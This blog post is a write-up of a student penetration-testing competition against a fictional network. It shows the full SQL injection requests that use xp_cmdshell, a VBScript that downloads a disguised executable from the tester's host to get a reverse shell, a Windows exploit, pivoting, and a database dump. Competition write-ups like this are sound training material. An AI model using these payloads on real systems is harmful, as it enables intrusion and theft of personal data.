---
layout: post
title: Revisiting CPTC 2015
---

Back in November, I was a member of the RIT team in the first ever Collegiate Penetration Testing Competition (CPTC). To read more about the event, check out [this post]({% post_url 2015-11-13-cptc-2015 %}). Given that this was the first year of the competition, there were a few compounding technical difficulties that led to a change of plans. Specifically, the infrastructure the competition was hosted on experienced some unpatched bugs that led to nonstop kernel panics, resulting in a backup infrastructure being deployed and used for the remainder of the competition. Due to the quick change of plans, the original intricately-designed infrastructure only saw the light of day for a few hours. The competition directors decided to re-open the infrastructure at a later date for teams to get the full intended experience of the competition.

This write-up details the path I took to breaching a data store in the competition network. Due to time constraints, I wasn’t able to discover all of the vulnerabilities available, so this write-up covers the progress I was able to make.

As part of our contract with the client, FinAck Government Industries, we were provided with a list of IP ranges and domains that would be in-scope for the test. Included in those ranges were the 172.22.16.0/24 and 172.22.17.0/24 networks and the fing.ov and ack.corp domains. The competition network was divided into the FinGov and AckCorp networks, with a few connections between them.

After running a port scan on the in-scope IPs, I discovered a web server on 172.22.16.2 (www.fing.ov) and the domain controller at 172.22.16.1 (ad-dc-01.fing.ov). The 172.22.17.0/24 network was inaccessible from my Kali box’s network position. Browsing to www.fing.ov revealed the company’s website.

[![FinGov website]({% link /resources/cptc2015/fingov1.PNG %})]({% link /resources/cptc2015/fingov1.PNG %})

The search function seemed like a promising target for SQL injection, but ended up not being functional. Continuing through the site, I found a careers page that uses an ‘id’ parameter to retrieve jobs.

[![FinGov careers page]({% link /resources/cptc2015/fingov2.PNG %})]({% link /resources/cptc2015/fingov2.PNG %})

The id parameter was SQL injectable:

[![FinGov SQL injection proof]({% link /resources/cptc2015/fingov3.PNG %})]({% link /resources/cptc2015/fingov3.PNG %})

After some prodding, I discovered the backend database was running MSSQL, and I could use xp_cmdshell to execute commands. To achieve a reverse shell on the database server, I created a binary payload using msfvenom.

[![msfvenom payload creation]({% link /resources/cptc2015/shell1.PNG %})]({% link /resources/cptc2015/shell1.PNG %})

Now I needed to get the binary on to the database server and run it. I spun up Apache on my Kali box to host the binary, and after some trial and error, used the [following VBScript](http://stackoverflow.com/questions/2973136/download-a-file-with-vbs/2973344#2973344) to download the file:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://172.25.4.28:9001/svchost.exe", False : xHttp.Send
with bStrm : .type = 1 : .open : .write xHttp.responseBody : .savetofile "C:\WINDOWS\Temp\svchost.exe", 2 : end with
```

The script needed to be sent to the database server by exploiting the SQL injection. I used xp_cmdshell to create the script, run it, and then run the downloaded binary. I sent the following requests to accomplish this:

```
172.22.16.2/careers.aspx?id=1; exec xp_cmdshell 'echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") : dim bStrm: Set bStrm = createobject("Adodb.Stream") : xHttp.Open "GET", "http://172.25.4.28:9001/svchost.exe", False : xHttp.Send : with bStrm : .type = 1 : .open : .write xHttp.responseBody : .savetofile "C:\WINDOWS\Temp\svchost.exe", 2 : end with > C:\WINDOWS\Temp\script.vbs' --

172.22.16.2/careers.aspx?id=1; exec xp_cmdshell 'cscript C:\WINDOWS\Temp\script.vbs' --

172.22.16.2/careers.aspx?id=1; exec xp_cmdshell 'C:\WINDOWS\Temp\svchost.exe' --
```

Soon enough, I had a reverse shell on the MSSQL server (webdb2.fing.ov)!

[![Meterpreter session on webdb2]({% link /resources/cptc2015/shell2.PNG %})]({% link /resources/cptc2015/shell2.PNG %})

Going back to www.fing.ov, I decided to take another look at the exposed ports, and tested its Windows 2003 OS with MS08-067 and MS10-061 exploits. MS10-061 did the trick, and I was in to www.fing.ov with SYSTEM privileges. From www.fing.ov I was able to access the rest of the 172.22.17.0/24 network, and created a SOCKS proxy to tunnel traffic through the exploited web server. Using proxychains, I scanned the 172.22.17.0/24 network but didn’t find any further exploits. I went back to the web server and started picking through the web root until I found the database username and password in the source code of the careers page.

[![SQL credentials in source code]({% link /resources/cptc2015/sqlcreds1.PNG %})]({% link /resources/cptc2015/sqlcreds1.PNG %})

From there, I installed [sql-cli](https://github.com/hasankhan/sql-cli) on Kali and tunneled it through proxychains to log in to MSSQL. Poking through the database led me to the client_data table, where the SSNs, company names, phone numbers, and addresses of FinGov’s clients were stored.

[![PII dump]({% link /resources/cptc2015/sqlcreds2.PNG %})]({% link /resources/cptc2015/sqlcreds2.PNG %})

This was as far as I was able to get on the infrastructure. If I had more time, I would have continued poking at the other machines on the 172.22.17.0/24 network and tried to escalate privileges on webdb2.fing.ov.

Participating in the CPTC was an awesome learning experience. Re-opening the infrastructure for a longer period of time allowed myself and my teammates to focus on the systems and learn on the fly without the pressure of the competition. Every time I sat down to pick up where I left off, I got a little bit further and walked away having learned something new. Looking forward to next year’s competition!
